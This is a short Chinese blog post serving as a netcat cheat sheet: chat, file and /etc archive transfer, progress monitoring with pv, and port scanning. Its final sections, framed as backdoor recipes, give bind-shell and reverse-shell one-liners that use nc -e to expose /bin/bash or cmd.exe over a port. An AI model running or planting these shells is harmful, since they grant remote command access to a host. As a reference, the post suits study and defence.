# nc使用 - Emmoblin Blog

Chat
```
# 发送端
nc -l 3333
# 接受端
nc 127.0.0.1 3333
```

传送文件
```
# 发送端  
`cat backup.iso | nc -l 3333`  
# 接收端  
`nc 192.168.0.1 3333 > backup.iso`  
```

  
显示传送进度，可以使用管道监控,pv命令  
```
`cat backup.iso | pv -b | nc -l 3333`  
`nc 192.168.0.1 3333 | pv -b > backup.iso`  
```

  
本地打包文件，传送到远端  
```
`tar -czf - /etc/ | nc -l 3333`  
`nc 192.168.0.1 3333 | pv -b > mybackup.tar.gz`  
```

端口扫描
```
扫描端口，并返回相关信息
nc -z 192.168.0.1 80-90
```

如何正确的加密聊天
```
nc -l 3333
ssh  yantze@192.168.2.38 sleep 1; nc 127.0.0.1 3333
```

如何正确的创建后门
```
nc -l 3333 -e /bin/bash
nc -l 3333 -e cmd.exe
nc 127.0.0.1 3333
```

如何逆向后门
```
nc -l 3333
nc 127.0.0.1 3333 -e /bin/bash
```

## 资料
- https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
- http://www.g-loaded.eu/2006/11/06/netcat-a-couple-of-useful-examples/
- https://dragula.viettug.org/blogs/263.html
